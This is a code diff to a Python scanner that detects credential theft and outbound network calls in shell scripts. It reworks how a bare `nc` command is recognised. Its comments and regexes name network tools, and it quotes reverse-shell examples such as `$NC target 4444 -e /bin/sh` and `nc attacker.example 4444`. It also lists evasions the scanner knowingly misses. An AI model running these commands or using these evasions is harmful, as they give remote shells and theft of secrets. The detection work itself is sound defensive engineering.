@@ -4864,37 +4864,35 @@ _SH_CRED_FILE_RE = re.compile(
 )
 # Outbound commands that can send data off the machine.
 # B-341 (SkillTrustBench fp_attribution, B13 39%-of-FPs bucket): the bare `nc` alternative
-# collided with two extremely common benign shapes that also satisfy `\bnc\b` under
-# re.I — (1) `${NC}`, the near-universal bash "No Color" ANSI-reset variable
-# (`NC='\033[0m'` alongside RED/GREEN/CYAN/BOLD/DIM is standard colored-output
-# boilerplate), and (2) a combined short-flag cluster on an unrelated command, e.g. `jq
-# -nc` (jq's `-n -c`).
+# used to live directly in this regex as `(?<![{-])\bnc\b(?!\s*=)`, excluding only two
+# single characters immediately before the word: `{` (`${NC}`, bash's near-universal "No
+# Color" ANSI-reset variable) and `-` (a combined short-flag cluster on an unrelated
+# command, e.g. `jq -nc`). Round-1 also excluded a bare `$NC`, but independent C-135
+# review (round 2) found that unsound — `NC=nc; $NC target 4444 -e /bin/sh` is a real,
+# ordinary alias-bypass evasion the `$`-exclusion made invisible — so only `{` stayed
+# excluded, leaving bare `$NC` deliberately matching (residual, see B-430 below).
 #
-# Round-1 fix ALSO excluded a bare `$NC` (no braces) via a `$`-in-the-lookbehind
-# exclusion. Independent C-135 review (round 2) found that unsound and gave a concrete
-# bypass: `alias`-free evasion routinely invokes a program through a variable —
-# `NC=nc; $NC target 4444 -e /bin/sh` — which is a completely ordinary technique, not a
-# corner case, and the `$`-exclusion made that invisible. The braced form `${NC}` is
-# UNAMBIGUOUS — brace-delimited parameter expansion can only ever be a variable
-# reference, never a command position — but a bare `$NC` is genuinely ambiguous (color
-# echo OR program-alias invocation) with no sound regex-level way to tell them apart, so
-# per this project's bias (a residual FP beats a false negative), it is deliberately
-# LEFT MATCHING: only the `{`-immediately-before shape is excluded now, not `$` alone.
-# The `-` exclusion (a flag cluster on an unrelated command, e.g. `-nc`) is untouched —
-# it wasn't part of the C-135 finding and a real `nc` invocation is never spelled as a
-# bare word directly glued onto a preceding hyphen. The trailing `(?!\s*=)` still
-# excludes only a literal ASSIGNMENT (`NC='\033[0m'`), never an invocation.
+# B-430: a lookbehind can only ever exclude a FIXED, finite set of preceding characters,
+# and four C-135 rounds on this line (each scoped to `${NC}`/`-nc` only) never noticed
+# that `.`, `/`, `(`, `[`, `;`, `#` are ALL equally valid `\b` left-boundaries a bare
+# `nc` can sit after. The highest-value miss: the `.nc` FILE EXTENSION — NetCDF
+# (climate/ocean/atmospheric science's standard data format) and CNC G-code both use it
+# universally, and any path ending `.nc` sits right after a `.`, which `(?<![{-])` never
+# excluded. That hard-FAILed a skill reading `sst_2026-07-31.nc` next to an unrelated API
+# key as "ClawHavoc class ... uninstall NOW and rotate your secrets".
 #
-# Residual (documented, not solved by more lookbehind cleverness — C-135 round 2's own
-# conclusion): every SkillTrustBench false-condemnation case in this bucket happened to
-# use ONLY the braced `${NC}` form for the actual FP-causing line, so this narrower
-# exclusion still clears all of them (verified: tests/test_shell_scan.py); a hypothetical
-# benign script that only ever writes bare `$NC` (no braces) for its color-reset variable
-# would still trip this pattern — accepted, since the alternative is the real evasion gap
-# above.
-_SH_OUTBOUND_RE = re.compile(
-    r"\b(?:curl|wget|ncat|netcat)\b|(?<![{-])\bnc\b(?!\s*=)|/dev/tcp/", re.I
-)
+# Rather than add a 5th excluded character (whack-a-mole this project's own C-135
+# doctrine warns against), the bare-`nc`/`ncat`/`netcat` alternative is REMOVED from this
+# compiled regex entirely for the ambiguous bare-`nc` case and reimplemented as
+# `_sh_bare_nc_invocation()` below: a whitespace/metacharacter TOKEN classifier requiring
+# `nc` to be its own isolated shell word (not a substring of `sst_2026-07-31.nc`,
+# `/nc/index.php`, `${nodes[nc]}`, or `nc=$((nc+1))` — none of those are ever a
+# standalone token) AND in command position AND followed by an argument-shaped token.
+# `ncat`/`netcat` stay here unchanged (no reported collision — nothing ends a path in
+# `.ncat`), as does `/dev/tcp/` (an unambiguous literal, no word-boundary ambiguity at
+# all). See `_sh_bare_nc_invocation`'s docstring for the full mechanism, the `$NC`
+# residual carry-over, and what this round's C-135 tried and retracted.
+_SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|ncat|netcat)\b|/dev/tcp/", re.I)
 # curl|wget URL piped into a NON-shell interpreter (download -> exec) — extends the
 # sh/bash-only _PIPE_SHELL_RE (the checks engine) to python/node/perl/ruby/php/deno.
 _SH_PIPE_INTERP_RE = re.compile(
@@ -4932,9 +4930,9 @@ _SH_EVAL_REMOTE_RE = re.compile(
 )
 # raw-socket outbound (nc//dev/tcp) — deliberately EXCLUDES curl/wget, which legitimately
 # carry an auth header to an API. Sending a secret over a raw socket is not legitimate.
-# B-341: same bare-`nc` collision/exclusion as _SH_OUTBOUND_RE above (see its comment,
-# including the round-2 C-135 finding on why only `{` — not bare `$` — is excluded).
-_SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|(?<![{-])\bnc\b(?!\s*=)|/dev/tcp/", re.I)
+# B-341/B-430: same bare-`nc` history as _SH_OUTBOUND_RE above — see its comment. The
+# bare-`nc` alternative lives in `_sh_bare_nc_invocation()` now, not in this regex.
+_SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|/dev/tcp/", re.I)
 # a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/…). Gating env->outbound
 # on the name (not any $VAR) is what keeps this zero-FP against authed-API scripts.
 _SH_CRED_ENV_RE = re.compile(
@@ -4944,17 +4942,197 @@ _SH_CRED_ENV_RE = re.compile(
     re.I,
 )
 
+# B-430: metacharacters that can glue directly onto a word with no surrounding
+# whitespace (`foo;nc`, `(nc`, `` `nc ``) get spaced out before whitespace-splitting, so
+# an `nc` glued to a separator is still recognized as its own token. `)` is deliberately
+# EXCLUDED from this list — see `_sh_bare_nc_invocation`'s case-label note below.
+_SH_NC_METACHAR_RE = re.compile(r"([;&|(`])")
+# A trailing token after `nc` that looks like a bare port number, tolerating whatever
+# punctuation (`)`, `;`, a trailing quote/backtick) sits glued on the end with no space.
+_SH_NC_PORT_RE = re.compile(r"^\d{1,5}[)\];,`\"']*$")
+# A single combined `host:port` argument, same trailing-punctuation tolerance.
+_SH_NC_HOSTPORT_RE = re.compile(r"^[\w.-]+:\d{1,5}[)\];,`\"']*$")
+# Tokens that unambiguously start a new command segment — `nc` immediately after one of
+# these is always in command position. `-exec` (find's own syntax: the word right after
+# it is always the command name) rides along here rather than in the no-op prefix set
+# below, since — unlike `sudo`/`env`/etc. — arbitrary `find` flags can sit between `find`
+# and `-exec`, so `-exec` itself (not whatever precedes it) is the anchor.
+_SH_NC_SEGMENT_START = frozenset(
+    {";", "|", "&", "(", "`", "then", "do", "else", "elif", "!", "-exec"}
+)
+# No-op wrapper words: skipping backward over any of these (plus flag-shaped tokens and
+# `VAR=val` prefix assignments, handled in `_sh_nc_command_position`) still counts as
+# command position — covers `sudo nc …`, `command nc …`, `env FOO=bar nc …`,
+# `eval "nc …"`, `xargs -n1 nc …`.
+_SH_NC_NOOP_PREFIX = frozenset(
+    {
+        "sudo",
+        "exec",
+        "command",
+        "nohup",
+        "time",
+        "nice",
+        "ionice",
+        "stdbuf",
+        "setsid",
+        "eval",
+        "env",
+        "xargs",
+    }
+)
+_SH_NC_VAR_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=\S*$")
+
+
+def _sh_nc_word(tok: str) -> str:
+    """Normalize one whitespace/metachar-delimited shell word for bare-`nc` identity
+    comparison. Strips surrounding quote characters, a single leading backslash (the
+    `\\nc` alias/function-shadow bypass — backslash-escaping a command name to skip a
+    shell alias or function of the same name is a real, documented evasion, not a corner
+    case), and a single leading bare `$` (the deliberately-preserved `$NC` alias-
+    invocation residual carried over from B-341 round 2 — `NC=nc; $NC host 4444` is a
+    real evasion with no sound way to distinguish it from a bare color-reset variable at
+    the token level, so it is intentionally still treated as `nc`, same as before).
+    Braced `${NC}` is NOT unwrapped by the `$`-strip (the leading `{` blocks it), so it
+    stays unambiguous parameter expansion and never compares equal to a bare `nc`."""
+    t = tok.strip("'\"")
+    if t.startswith("\\"):
+        t = t[1:]
+    if t.startswith("$") and not t.startswith("${"):
+        t = t[1:]
+    return t
+
+
+def _sh_nc_command_position(words: list, i: int) -> bool:
+    """True if `words[i]` sits where a shell COMMAND NAME can appear: at the start of the
+    line/segment, or reached by skipping backward only over no-op wrapper words
+    (`_SH_NC_NOOP_PREFIX`), `VAR=val` prefix assignments, and flag-shaped tokens (`-n1`,
+    `-u`, …) — covering `sudo nc …`, `env FOO=bar nc …`, `xargs -n1 nc …`, `eval "nc …"`,
+    and (via `_SH_NC_SEGMENT_START`) `find … -exec nc …`. Any other word in between (a
+    filename, `for`, `case`, a trailing-comment `#`, …) blocks it — this is what excludes
+    the `case … in` / `nc)` pattern label, the `for nc in …` loop variable, and an `nc`
+    mentioned inside a trailing inline comment (masking only blanks WHOLE-LINE comments;
+    see `_sh_mask_comments`)."""
+    j = i - 1
+    while j >= 0:
+        w = words[j]
+        low = w.lower()
+        if w in _SH_NC_SEGMENT_START or low in _SH_NC_SEGMENT_START:
+            return True
+        if low in _SH_NC_NOOP_PREFIX:
+            j -= 1
+            continue
+        if w.startswith("-") and len(w) > 1:
+            j -= 1
+            continue
+        if _SH_NC_VAR_ASSIGN_RE.match(w):
+            j -= 1
+            continue
+        return False
+    return True
+
+
+def _sh_nc_arg_follows(words: list, i: int) -> bool:
+    """True if the word(s) after `words[i]` look like real `nc` arguments: a flag (`-e`,
+    `-lvp`, …) anywhere in the next few words (covers a port-before-flag ordering, e.g.
+    an `xargs`-appended arg landing before an explicit `-e`), a combined `host:port`, or
+    a bare host word followed by a numeric port word (`nc attacker.example 4444`) —
+    excluding a case-label's `)`, an arithmetic reference, or ordinary prose (a trailing
+    comment's next English word)."""
+    window = [w.strip("'\"") for w in words[i + 1 : i + 4]]
+    if not window:
+        return False
+    if any(w.startswith("-") and len(w) > 1 for w in window):
+        return True
+    nxt = window[0]
+    if _SH_NC_HOSTPORT_RE.match(nxt):
+        return True
+    if not nxt.startswith("-") and len(window) >= 2 and _SH_NC_PORT_RE.match(window[1]):
+        return True
+    return False
+
+
+def _sh_bare_nc_invocation(line: str) -> bool:
+    """B-430: whole-token, position-aware replacement for the bare-`nc` alternative that
+    used to live inside `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE` as
+    `(?<![{-])\\bnc\\b(?!\\s*=)`.
+
+    Four prior C-135 rounds each patched that lookbehind for one collision at a time
+    (`${NC}`, then `-nc`/`jq -nc`), and none of them could have caught this ticket's gap:
+    a single-character lookbehind can exclude at most one preceding character, but `.`,
+    `/`, `(`, `[`, `;`, `#` are ALL valid `\\b` left-boundaries for a bare `nc` that a
+    lookbehind-only design can never enumerate completely (the highest-value miss is the
+    `.nc` file extension — NetCDF and CNC G-code both use it, and any path ending `.nc`
+    sits right after a `.`). Rather than add yet another excluded character, bare-`nc`
+    detection moves to an isolated shell WORD + command-position + argument-shape check:
+
+      1. `nc` must be its OWN whitespace/metachar-delimited token, not a substring of a
+         longer one. This alone kills the whole `.nc`/`/nc/`/`${nodes[nc]}`/
+         `nc=$((nc+1))` collision class — none of those is ever a standalone token.
+      2. It must sit in COMMAND POSITION (`_sh_nc_command_position`) — excludes the
+         `case … in` / `nc)` pattern label and the `for nc in …` loop variable, both real
+         standalone tokens that are never a command name.
+      3. It must be followed by an argument-shaped token (`_sh_nc_arg_follows`) — a
+         second, independent signal that excludes an `nc` mentioned in a trailing inline
+         comment (`curl ... # nc is not used here` still reaches this scan, since
+         `_sh_mask_comments` only blanks WHOLE-LINE comments); ordinary English prose
+         after `nc` is essentially never flag- or host:port-shaped.
+
+    The deliberately-preserved `$NC`-alias-invocation residual from B-341 round 2 carries
+    over unchanged (see `_sh_nc_word`): `NC=nc; $NC host 4444 -e /bin/sh` still matches,
+    braced `${NC}` still doesn't. Adding the command-position requirement actually makes
+    this residual NARROWER, not just relocated: a bare `echo "$NC"` (unbraced, but not in
+    command position either) no longer matches, where the old position-blind regex would
+    have.
+
+    C-135 (this round) considered also closing three narrower gaps inside this same
+    function; all three were retracted per CLAUDE.md §2.5, documented here rather than
+    attempted a 6th narrow-regex-style iteration:
+
+      - `sudo -u root nc …` — an option VALUE (`root`), not a flag, sits between the
+        wrapper and `nc`. Distinguishing an option's VALUE from a bare positional
+        argument needs per-command flag-arity knowledge (`-u` takes a value on `sudo`,
+        `-name`'s value on `find` sits the same way) this generic token scanner cannot
+        have without becoming unsound for some OTHER wrapper's flags.
+      - general variable-reconstruction (`cmd="n"; cmd+="c"; $cmd …`) — needs real
+        data-flow tracking this per-line, non-parsing scanner has never had.
+      - `xargs nc 4444` with only ONE static numeric argument and no explicit `-I{}`
+        placeholder — relies on xargs's default behavior of APPENDING the piped-in value
+        as the LAST argument, which would actually run `nc 4444 <host>`. Per `nc(1)`,
+        the positional syntax is `nc [flags] [destination] [port]` — destination first —
+        so that argument ORDER is not a functionally valid exfiltration payload in the
+        first place; `xargs -I{} nc {} 4444 …` (explicit placeholder, syntactically
+        correct) is still caught (see tests).
+
+    None of these are a NEW gap this change introduces: the OLD `\\bnc\\b`
+    search-anywhere regex textually matched all three (it doesn't care what follows), so
+    strictly it "caught" them, but the first two were never reachable exploits without a
+    real shell/data-flow engine this scanner doesn't have, and the third isn't a working
+    payload as written. All three remain accepted, documented blind spots of a
+    stdlib-only, non-parsing, per-line shell scanner — not silently dropped."""
+    if "nc" not in line.lower():
+        return False
+    words = _SH_NC_METACHAR_RE.sub(r" \1 ", line).split()
+    for i, tok in enumerate(words):
+        if _sh_nc_word(tok).lower() != "nc":
+            continue
+        if not _sh_nc_command_position(words, i):
+            continue
+        if _sh_nc_arg_follows(words, i):
+            return True
+    return False
+
 
 # B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
 # unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
 # '{...,password:$password}'` matching SHELL_ENV_EXFIL — but the actual trigger turned
 # out to be `_SH_RAW_SOCKET_RE` matching "nc" inside jq's own `-nc` (`-n -c`) combined
-# short-flag cluster, NOT a real credential-var/raw-socket pairing. Once
-# `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE` were narrowed (above) to stop matching a bare
-# `nc` immediately preceded by `-` (a flag cluster on some OTHER command) or `{` (a
-# `${NC}` variable reference), `_SH_RAW_SOCKET_RE` no longer matches that line at all —
-# this SHELL_ENV_EXFIL check is never even reached for it, so both corpus cases are
-# already resolved. VERIFIED empirically against the real fixture content, not assumed.
+# short-flag cluster, NOT a real credential-var/raw-socket pairing. Once the bare-`nc`
+# matching (now `_sh_bare_nc_invocation`, née the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
+# lookbehind — see B-430 above) stopped matching a bare `nc` immediately preceded by `-`
+# (a flag cluster on some OTHER command) or `{` (a `${NC}` variable reference), that
+# match no longer fires on `-nc` at all — this SHELL_ENV_EXFIL check is never even
+# reached for it, so both corpus cases are already resolved. VERIFIED empirically against
+# the real fixture content, not assumed.
 #
 # Four independent rounds (C-135) were spent trying to ALSO add quote/jq-template
 # awareness directly to this check specifically, on the (incorrect) assumption that the
@@ -4963,9 +5141,8 @@ _SH_CRED_ENV_RE = re.compile(
 # regex, a proper bash lexer) was retracted after breaking some other real case — full
 # history preserved in `checks._vet._redirect_targets_file`'s docstring, whose sibling
 # fix (the comment-line redirect exclusion) DOES have a genuine remaining residual.
-# Nothing from those four rounds landed here: the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
-# narrowing above was sufficient on its own, and this check is otherwise pre-B-341
-# behavior, unchanged.
+# Nothing from those four rounds landed here: the bare-`nc` narrowing above was
+# sufficient on its own, and this check is otherwise pre-B-341 behavior, unchanged.
 
 
 # B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
@@ -5127,7 +5304,12 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
         )
 
     for i, raw in enumerate(masked.splitlines(), 1):
-        if _SH_RAW_SOCKET_RE.search(raw) and _SH_CRED_ENV_RE.search(raw):
+        # B-430: the raw-socket check is `_SH_RAW_SOCKET_RE` (ncat/netcat/`/dev/tcp/`,
+        # unambiguous) OR'd with `_sh_bare_nc_invocation` (the token classifier for the
+        # ambiguous bare `nc` — see its docstring above).
+        if (
+            _SH_RAW_SOCKET_RE.search(raw) or _sh_bare_nc_invocation(raw)
+        ) and _SH_CRED_ENV_RE.search(raw):
             add(
                 "SHELL_ENV_EXFIL",
                 "crit",
@@ -5138,7 +5320,8 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
 
     cred_vars = {m.group("var") for m in _SH_CRED_ASSIGN_RE.finditer(masked)}
     for i, raw in enumerate(masked.splitlines(), 1):
-        if not _SH_OUTBOUND_RE.search(raw):
+        # B-430: same OR pattern as above — see _sh_bare_nc_invocation's docstring.
+        if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
             continue
         if _SH_CRED_FILE_RE.search(raw):
             add(
